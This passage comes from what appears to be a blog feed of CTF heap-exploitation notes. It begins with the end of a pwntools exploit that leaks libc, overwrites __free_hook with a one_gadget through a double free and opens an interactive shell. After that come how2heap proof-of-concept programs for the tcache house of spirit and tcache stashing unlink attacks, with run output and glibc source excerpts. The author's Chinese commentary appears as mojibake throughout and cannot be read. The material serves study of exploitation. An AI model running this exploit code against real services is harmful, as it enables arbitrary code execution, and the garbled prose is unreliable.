gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0xf8</span>,<span class="string">b&#x27;null-byte-overflow&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0x10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;900&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># rl()</span></span><br><span class="line">main_arean=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span></span><br><span class="line">malloc_hook=main_arean-<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;main_arean&#x27;</span>,main_arean)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base=malloc_hook-libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, p64(libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)+base))</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;fuck&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">one_gadget=base+<span class="number">0x4f302</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Off By One </tag>
            
            <tag> Free Hook </tag>
            
            <tag> Null Byte Overflow </tag>
            
            <tag> Overlapping Heap Chunk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache house of spirit &amp;&amp; Tcache stashing unlink attack</title>
      <link href="/2023/03/27/Tcache_house_of_spirit-unlink/"/>
      <url>/2023/03/27/Tcache_house_of_spirit-unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache-house-of-spirit"><a href="#Tcache-house-of-spirit" class="headerlink" title="Tcache house of spirit"></a>Tcache house of spirit</h2><p>how2heap tcache_house_of_spirit.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Starting program: /mnt/hgfs/Share/how2heap/glibc_2<span class="number">.27</span>/tcache_house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack on tcache.</span><br><span class="line">It works in a similar way to original house of spirit but you don<span class="number">&#x27;</span>t need to create fake chunk after the fake chunk that will be freed.</span><br><span class="line">You can see this in <span class="built_in">malloc</span>.c in function _int_free that tcache_put is called without checking <span class="keyword">if</span> next chunk<span class="number">&#x27;</span>s size and prev_inuse are sane.</span><br><span class="line">(Search <span class="keyword">for</span> strings <span class="string">&quot;invalid next size&quot;</span> and <span class="string">&quot;double free or corruption&quot;</span>)</span><br><span class="line"></span><br><span class="line">Ok. Let<span class="number">&#x27;</span>s start with the example!.</span><br><span class="line"></span><br><span class="line">Calling <span class="title function_">malloc</span><span class="params">()</span> once so that it sets up its memory.</span><br><span class="line">Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><br><span class="line">This region contains one fake chunk. It&#x27;s size field is placed at 0x7fffffffdee8</span><br><span class="line">This chunk size has to be falling into the tcache <span class="title function_">category</span> <span class="params">(chunk.size &lt;= <span class="number">0x410</span>; <span class="built_in">malloc</span> arg &lt;= <span class="number">0x408</span> on x64)</span>. The <span class="title function_">PREV_INUSE</span> <span class="params">(lsb)</span> bit is ignored by <span class="built_in">free</span> <span class="keyword">for</span> tcache chunks, however the <span class="title function_">IS_MMAPPED</span> <span class="params">(second lsb)</span> and <span class="title function_">NON_MAIN_ARENA</span> <span class="params">(third lsb)</span> bits cause problems.</span><br><span class="line">... note that this has to be the size of the next <span class="built_in">malloc</span> request rounded to the internal size used by the <span class="built_in">malloc</span> implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="keyword">for</span> the <span class="built_in">malloc</span> parameter at the end.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdee8.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next <span class="built_in">malloc</span> will <span class="keyword">return</span> the region of our fake chunk at 0x7fffffffdee8, which will be 0x7fffffffdef0!</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(<span class="number">0x30</span>)</span>: 0x7fffffffdef0</span><br><span class="line">[Inferior 1 <span class="params">(process <span class="number">6552</span>)</span> exited normally]</span><br></pre></td></tr></table></figure><p>é¢ï¼Œæ¯”fastbinç®€å•å¤šäº†</p><p>ä¼ªé€ å®Œæˆ</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327160459074.png" alt="image-20230327160459074"></p><h2 id="Tcache-stashing-unlink-attack"><a href="#Tcache-stashing-unlink-attack" class="headerlink" title="Tcache stashing unlink attack"></a>Tcache stashing unlink attack</h2><p>how2heap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">This file demonstrates the stashing unlink attack on tcache.</span><br><span class="line"></span><br><span class="line">This poc has been tested on both glibc <span class="number">2.27</span> and glibc <span class="number">2.29</span>.</span><br><span class="line"></span><br><span class="line">This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it<span class="number">&#x27;</span>s necessary to alloc a chunk with <span class="built_in">calloc</span> at least once. Last not least, we need a writable address to bypass check in glibc</span><br><span class="line"></span><br><span class="line">The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.</span><br><span class="line"></span><br><span class="line">This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this <span class="keyword">case</span> we<span class="number">&#x27;ll</span> create the chunk on the <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">Stack_var emulates the fake chunk we want to alloc to.</span><br><span class="line"></span><br><span class="line">First let<span class="number">&#x27;</span>s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[<span class="number">2</span>] as the fake bk. Later we can see *(fake_chunk-&gt;bk + <span class="number">0x10</span>) which is stack_var[<span class="number">4</span>] will be a libc addr after attack.</span><br><span class="line"></span><br><span class="line">You can see the value of fake_chunk-&gt;bk is:<span class="number">0x7fffffffde30</span></span><br><span class="line"></span><br><span class="line">Also, let<span class="number">&#x27;</span>s see the initial value of stack_var[<span class="number">4</span>]:(nil)</span><br><span class="line"></span><br><span class="line">Now we alloc <span class="number">9</span> chunks with <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">free</span> <span class="number">7</span> of them in order to put them into tcache. Carefully we didn<span class="number">&#x27;</span>t <span class="built_in">free</span> a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins <span class="keyword">while</span> chunk0 and chunk2 will be put into unsorted bin.</span><br><span class="line"></span><br><span class="line">Now we alloc a chunk larger than <span class="number">0x90</span> to put chunk0 and chunk2 into small bin.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">malloc</span> two chunks to spare space <span class="keyword">for</span> small bins. After that, we now have <span class="number">5</span> tcache bins and <span class="number">2</span> small bins</span><br><span class="line"></span><br><span class="line">Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: <span class="number">0x7fffffffde20</span>.</span><br><span class="line"></span><br><span class="line">Finally we alloc a <span class="number">0x90</span> chunk with <span class="built_in">calloc</span> to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.</span><br><span class="line"></span><br><span class="line">Now our fake chunk has been put into tcache bin[<span class="number">0xa0</span>] <span class="built_in">list</span>. Its fd pointer now point to next <span class="built_in">free</span> chunk: <span class="number">0x6033a0</span> and the bck-&gt;fd has been changed into a libc addr: <span class="number">0x7ffff7dcdd30</span></span><br><span class="line"></span><br><span class="line">As you can see, next <span class="built_in">malloc</span>(<span class="number">0x90</span>) will <span class="keyword">return</span> the region our fake chunk: <span class="number">0x7fffffffde30</span></span><br></pre></td></tr></table></figure><p><strong>tcacheæœ‰å‰©ä½™æ—¶ï¼Œsmall binä¸‹ä¸€æ¬¡mallocæ—¶ä¼šæŒ‰ç…§bkæŒ‡å‘æ”¾å…¥åˆé€‚tcachebinï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­åªå¯¹ç¬¬ä¸€ä¸ª bin è¿›è¡Œäº†å®Œæ•´æ€§æ£€æŸ¥__glibc_unlikely (bck-&gt;fd !&#x3D; victim)ï¼Œåé¢çš„å †å—çš„æ£€æŸ¥ç¼ºå¤±</strong></p><p><strong>callocä¸ä¼šåœ¨tcachebiné‡Œç”³è¯·å†…å­˜</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;stack_var</span><br><span class="line"><span class="number">0x7fffffffde20</span></span><br><span class="line">&amp;chunk_lis</span><br><span class="line"><span class="number">0x7fffffffdea0</span></span><br><span class="line">&amp;target</span><br><span class="line"><span class="number">0x7fffffffde18</span></span><br></pre></td></tr></table></figure><ol><li><p>stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);å³0x7fffffffde38å†™å…¥0x7fffffffde30ï¼Œå…·ä½“ä¸ºä»€ä¹ˆè¿™æ ·åé¢è§£é‡Š</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327234406124.png" alt="image-20230327234406124"></p></li><li><p>å…ˆmallocäº†0xa0(malloc arg&#x3D;0x90)å¤§å°çš„ä¹ä¸ªå †ï¼Œæˆ‘ä»¬å«ä»–chunk0-8æŠŠ</p></li><li><p>æŠŠchunk3-chunk8é‡Šæ”¾æ‰è¿›å…¥tcachebin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327232412518.png" alt="image-20230327232412518" style="zoom:80%;"></li><li><p><code>free(chunk_lis[1]);</code>å0xa0tcachebinæ»¡7ä¸ªï¼Œ<code>free(chunk_lis[0]);free(chunk_lis[2]);</code>ä¼šè¿›å…¥unsorted bin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327232958585.png" alt="image-20230327232958585" style="zoom:80%;"></li><li><p><code>malloc(0xa0);</code>æ²¡æœ‰åˆé€‚å¤§å°chunkï¼Œé‡æ–°åˆ†é…ä¸€ä¸ªï¼Œä½†æ˜¯ä¼šè§¦å‘unsortedbinåˆ†ç±»æ“ä½œï¼Œtcacheæ»¡äº†ï¼Œ0xa0å¤§å°chunkä¼šè¿›å…¥small biné‡Œ</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233240585.png" alt="image-20230327233240585" style="zoom: 80%;"></li><li><p><code>malloc(0x90);malloc(0x90);</code>æŠŠtcacheå‰ä¸¤ä¸ªç”³è¯·å‡ºæ¥</p></li></ol>   <img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233621133.png" alt="image-20230327233621133" style="zoom:80%;"><ol start="7"><li><p><code> chunk_lis[2][1] = (unsigned long)stack_var;</code>æŠŠchunk2çš„bkæŒ‡é’ˆæ”¹ä¸º&amp;stack_var&#x3D;0x7fffffffde20</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233912304.png" alt="image-20230327233912304"></p></li><li><p><code>calloc(1,0x90);</code>FIFOåŸåˆ™ï¼Œä¼šä»smallbinæ‹¿èµ°chunk0ï¼Œè¿™æ—¶å€™tcacheæœ‰ç©ºä½ï¼Œä¼šæŠŠsmall biné‡Œçš„ä¸œè¥¿ç»™ç§»åˆ°tcachebin</p><p>çœ‹ä¸‹æºç æ€ä¹ˆä»small binæŠŠchunk0æ‹¿èµ°çš„çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    <span class="comment">// è·å– small bin çš„ç´¢å¼•</span></span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">// å…ˆæ‰§è¡Œ victim = last(bin)ï¼Œè·å– small bin çš„æœ€åä¸€ä¸ª chunk</span></span><br><span class="line">    <span class="comment">// è‹¥ç»“æœ victim = bin ï¼Œé‚£è¯´æ˜è¯¥ bin ä¸ºç©ºã€‚</span></span><br><span class="line">    <span class="keyword">if</span> ( ( victim = last (bin) ) != bin )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚</span></span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="comment">// æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ </span></span><br><span class="line">        <span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        <span class="comment">// è®¾ç½® victim å¯¹åº”çš„ inuse ä½</span></span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">// ä¿®æ”¹ small bin é“¾è¡¨ï¼Œå°† small bin çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥</span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>å¯¹chunk0è¿›è¡Œbckå°±æ˜¯chunk2,victimæ˜¯chunk0ï¼Œbck-&gt;fd !&#x3D; victimæ£€æµ‹chunk2æ²¡æœ‰ç ´åfdæŒ‡é’ˆï¼Œç»•è¿‡ï¼Œå…¶ä½™æ²¡æœ‰å…¶ä»–æ£€æµ‹bkæŒ‡é’ˆçš„codeï¼Œ ä¹‹åè¿›è¡Œunlinkæ“ä½œbin-&gt;bk &#x3D; bck; bck-&gt;fd &#x3D; bin;ç»§ç»­æ„æˆå¾ªç¯é“¾è¡¨</p><p>çœ‹ä¸‹æºç æŠŠå…¶ä½™chunkæ”¾å…¥tcache binçš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//è·å–sizeå¯¹åº”çš„tcacheç´¢å¼•</span></span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//å¦‚æœè¿™ä¸ªç´¢å¼•åœ¨tcache binçš„èŒƒå›´é‡Œï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªsizeå±äºtcache binçš„èŒƒå›´</span></span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//å¦‚æœtcache binæ²¡æœ‰æ»¡</span></span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//å¹¶ä¸”small binä¸ä¸ºç©º,tc_victimä¸ºsmall binä¸­çš„æœ€åä¸€ä¸ªå †å—</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;<span class="comment">//è¿™é‡Œå–tc_victimçš„bkæŒ‡é’ˆï¼Œå¹¶æ²¡æœ‰é’ˆå¯¹bckåšåŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å»æ”»å‡»tc_victimçš„bkæŒ‡é’ˆ</span></span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;<span class="comment">//å°†tc_victimä»small binä¸­è„±é“¾</span></span><br><span class="line">              bck-&gt;fd = bin;<span class="comment">//å¦‚æœæˆ‘ä»¬ä¼ªé€ bckï¼Œè¿™é‡Œå°±å¯ä»¥å°†bck-&gt;fdçš„ä½ç½®å†™å…¥ä¸€ä¸ªbinçš„åœ°å€(main_arena+96)</span></span><br><span class="line">              tcache_put (tc_victim, tc_idx);<span 